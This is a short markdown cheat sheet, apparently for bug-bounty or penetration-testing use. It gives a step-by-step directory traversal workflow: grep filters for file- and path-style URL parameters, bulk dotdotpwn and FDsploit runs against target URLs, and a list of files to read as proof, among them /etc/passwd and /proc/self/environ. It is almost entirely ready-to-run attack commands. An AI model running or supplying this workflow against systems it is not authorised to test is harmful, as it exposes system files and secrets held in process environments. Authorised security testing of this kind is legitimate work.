## 🧰 TOOLS USED

```
dotdotpwn
FDsploit
```

## REQUIRED INPUT FILES

```
parameter.txt   → URLs with parameters
```

## 1) FILTER DIRECTORY TRAVERSAL PARAMETERS

```bash
grep -Ei "file=|path=|page=|doc=|folder=|dir=|include=|inc=|template=|load=|view=|name=" parameter.txt > traversal_params.txt
```

## 2) dotdotpwn – DIRECTORY TRAVERSAL DISCOVERY

###  REQUIREMENTS

```
• URL with FUZZ parameter
• traversal_params.txt (for bulk)
```

### SINGLE URL

```bash
dotdotpwn -u "https://target.com/download?file=FUZZ" -m http
```

### BULK FROM FILE

```bash
while read url; do dotdotpwn -u "$url" -m http; done < traversal_params.txt
```

## 3) FDsploit – FILE DISCLOSURE & EXPLOITATION

### REQUIREMENTS

```
• Parameterized URL or file list
```

### SINGLE TARGET

```bash
python3 FDsploit.py -u "https://target.com/download?file=FUZZ"
```

### BULK TARGETS

```bash
python3 FDsploit.py -f traversal_params.txt
```

## 4) CONFIRMATION FILES

```
/etc/passwd
/etc/hosts
/proc/self/environ
C:\Windows\win.ini
```

## FINAL FLOW

```
parameter.txt
→ filter file/path params
→ dotdotpwn
→ FDsploit
```
